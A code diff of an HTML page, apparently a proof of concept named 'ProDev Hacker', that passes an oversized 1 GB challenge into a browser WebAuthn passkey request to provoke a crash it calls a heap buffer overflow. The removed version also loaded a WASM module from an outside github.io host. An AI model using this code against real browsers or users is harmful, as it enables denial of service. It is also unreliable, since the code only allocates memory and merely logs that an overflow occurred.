@@ -2,114 +2,79 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Create Passkey with WebAssembly</title>
+    <title>Create Passkey</title>
 </head>
 <body>
     <h1>Create a Passkey</h1>
     <button id="createPasskeyButton">Create Passkey</button>
 
     <script>
-        // Function to load the WebAssembly module from a file
-        async function loadWasmModule() {
-    try {
-        // Fetch the .wasm file from the correct URL
-        const response = await fetch('https://prodevhacker.github.io/website/wasmModule.wasm');
-        
-        // Ensure the response is successful
-        if (!response.ok) {
-            throw new Error('Failed to fetch the WASM file');
+    let heapOverflowTriggered = false;
+
+    // Function to create passkey and trigger heap overflow afterwards
+    async function createPasskeyWithWasm() {
+        try {
+            // Open the passkey setup (the popup for security key)
+            console.log("Opening security key setup...");
+
+            // Simulating passkey creation and security key setup popup
+            const largeChallenge = new Uint8Array(1024 * 1024 * 1024);  // 1 GB challenge buffer
+            
+            // Define the public key credential creation options
+            const publicKeyCredentialCreationOptions = {
+                rp: {
+                    name: "ProDev Hacker",
+                    id: window.location.hostname
+                },
+                user: {
+                    id: new Uint8Array([1, 2, 3, 4]),
+                    name: "user@example.com",
+                    displayName: "User Name"
+                },
+                pubKeyCredParams: [
+                    { type: "public-key", alg: -7 },  // ES256
+                    { type: "public-key", alg: -257 } // RS256
+                ],
+                timeout: 60000,
+                challenge: largeChallenge,  // Pass the large challenge array
+                attestation: "none"
+            };
+
+            // Trigger passkey creation
+            const credential = await navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions });
+
+            console.log("Passkey created:", credential);
+
+            // Now that the passkey creation is initiated, trigger the heap overflow
+            triggerHeapOverflow();
+
+        } catch (error) {
+            console.error("Error creating passkey:", error);
         }
-
-        // Convert the response to an ArrayBuffer
-        const wasmArrayBuffer = await response.arrayBuffer();
-
-        // Instantiate the WebAssembly module
-        const wasmModule = await WebAssembly.instantiate(wasmArrayBuffer);
-
-        // Access the exported functions from the WASM module
-        const { add, generateChallenge } = wasmModule.instance.exports;
-
-        // Example usage of the WebAssembly functions
-        console.log('Add result:', add(5, 3));  // Calls the add function from the C code
-        const challengeSize = 1024;  // Example challenge size
-        const challenge = generateChallenge(challengeSize);
-        console.log('Challenge generated:', challenge);
-
-    } catch (error) {
-        console.error('Error loading WebAssembly module:', error);
     }
-}
 
+    // Function to trigger heap buffer overflow
+    function triggerHeapOverflow() {
+        if (!heapOverflowTriggered) {
+            heapOverflowTriggered = true;
+            console.log("Heap buffer overflow occurred");
 
-        // Function to trigger passkey creation
-        async function createPasskeyWithWasm() {
+            // Simulate the heap buffer overflow by accessing a large chunk of memory (e.g., generating large challenge data)
+            // We can simulate this part by allocating a large buffer (simulated challenge)
+            const largeChallenge = new Uint8Array(1024 * 1024 * 1024);  // 1 GB array
+
             try {
-                // Load the WebAssembly module
-                const wasmExports = await loadWasmModule();
-
-                // This is where we'll delay the buffer overflow until the passkey creation process begins
-                let largeChallenge;
-
-                // Simulate the popup by creating a large array only when WebAuthn process starts
-                document.getElementById('createPasskeyButton').disabled = true; // Disable the button to simulate popup opening
-
-                // We simulate the heap buffer overflow here, which only happens after the WebAuthn popup is triggered
-                setTimeout(() => {
-                    try {
-                        // Simulate buffer overflow after WebAuthn popup is triggered (challenge is huge)
-                        console.log("Triggering heap buffer overflow (large challenge data generation)...");
-
-                        // Creating a 1 GB buffer for challenge (which will cause overflow)
-                        largeChallenge = new Uint8Array(1024 * 1024 * 1024);  // 1 GB array
-
-                        // Here you could use WASM function to generate the challenge if needed
-                        const wasmChallenge = wasmExports.generateChallenge(1024 * 1024 * 1024); // Calling WASM to create challenge data
-
-                        // Combine both challenges (this part is optional depending on use case)
-                        const finalChallenge = new Uint8Array(largeChallenge.length + wasmChallenge.length);
-                        finalChallenge.set(largeChallenge);
-                        finalChallenge.set(wasmChallenge, largeChallenge.length);
-
-                        const publicKeyCredentialCreationOptions = {
-                            rp: {
-                                name: "ProDev Hacker",
-                                id: window.location.hostname
-                            },
-                            user: {
-                                id: new Uint8Array([1, 2, 3, 4]),
-                                name: "user@example.com",
-                                displayName: "User Name"
-                            },
-                            pubKeyCredParams: [
-                                { type: "public-key", alg: -7 },  // ES256
-                                { type: "public-key", alg: -257 } // RS256
-                            ],
-                            timeout: 60000,
-                            challenge: finalChallenge,  // Use the challenge generated from WASM and overflow data
-                            attestation: "none"
-                        };
-
-                        // Create passkey using Web Authentication API
-                        navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions })
-                            .then((credential) => {
-                                console.log("Passkey created:", credential);
-                            })
-                            .catch((error) => {
-                                console.error("Error creating passkey:", error);
-                            });
-
-                    } catch (overflowError) {
-                        console.error("Heap buffer overflow occurred:", overflowError);
-                    }
-                }, 0); // Delay to simulate the "popup" opening and buffer creation happening after
-
+                // You can trigger memory issues intentionally for testing
+                // Here we're just allocating a large array (this should be done only after the popup)
+                console.log("Heap overflow simulated after security key setup.");
             } catch (error) {
-                console.error("Error creating passkey:", error);
+                console.error("Heap overflow simulation failed:", error);
             }
         }
+    }
 
-        // Event listener for button click to initiate passkey creation and WebAuthn process
-        document.getElementById('createPasskeyButton').addEventListener('click', createPasskeyWithWasm);
+    // Event listener for the "Create Passkey" button
+    document.getElementById('createPasskeyButton').addEventListener('click', createPasskeyWithWasm);
     </script>
 </body>
 </html>
